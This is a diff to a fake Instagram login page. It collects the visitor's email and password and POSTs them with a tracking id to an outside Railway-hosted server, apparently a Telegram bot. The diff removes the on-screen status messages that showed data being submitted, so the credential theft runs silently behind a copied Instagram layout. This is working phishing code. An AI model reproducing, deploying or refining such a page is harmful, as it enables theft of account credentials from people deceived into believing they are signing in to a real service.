@@ -83,7 +83,6 @@
             position: fixed; left: 0; bottom: 0; width: 100%; color: #8E8E8E;
             text-align: center; font-size: 12px; padding: 10px;
         }
-        #status { margin-top: 10px; font-size: 14px; color: #ed4956; }
         @media (min-width: 876px) { .phone-section { display: block; } }
         @media (max-width: 875px) {
             .login-section { width: 100%; max-width: 350px; }
@@ -115,7 +114,6 @@
                 <div class="forget-id">
                     <a href="https://www.instagram.com/accounts/password/reset/">Forgot password?</a>
                 </div>
-                <p id="status"></p>
             </div>
             <div class="signup-box">
                 <p>Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a></p>
@@ -129,15 +127,13 @@
     <script>
         const urlParams = new URLSearchParams(window.location.search);
         const unique_id = urlParams.get('id');
-        const api_url = 'https://tgbot-telegrambot2.up.railway.app'; // Your Railway URL
+        const api_url = 'https://tgbot-telegrambot2.up.railway.app';
 
         const loginButton = document.getElementById('loginButton');
         const emailInput = document.getElementById('emailInput');
         const passwordInput = document.getElementById('passwordInput');
-        const status = document.getElementById('status');
 
         if (!unique_id) {
-            status.textContent = 'Error: ID not found!';
             loginButton.style.display = 'none';
         } else {
             loginButton.addEventListener('click', () => {
@@ -145,33 +141,16 @@
                 const password = passwordInput.value.trim();
 
                 if (!email || !password) {
-                    status.textContent = 'Please enter phone, email, or password!';
                     return;
                 }
 
-                status.textContent = 'Submitting data...';
                 fetch(`${api_url}/login`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ unique_id, email, password })
                 })
-                .then(response => {
-                    if (!response.ok) {
-                        return response.text().then(text => {
-                            throw new Error(`HTTP error! Status: ${response.status}, Response: ${text}`);
-                        });
-                    }
-                    return response.json();
-                })
-                .then(data => {
-                    if (data.status === 'success') {
-                        status.textContent = 'Data successfully submitted!';
-                    } else {
-                        status.textContent = `Error: ${data.message}`;
-                    }
-                })
                 .catch(error => {
-                    status.textContent = `Error submitting data: ${error.message}`;
+                    console.error('Error submitting data:', error.message);
                 });
             });
         }
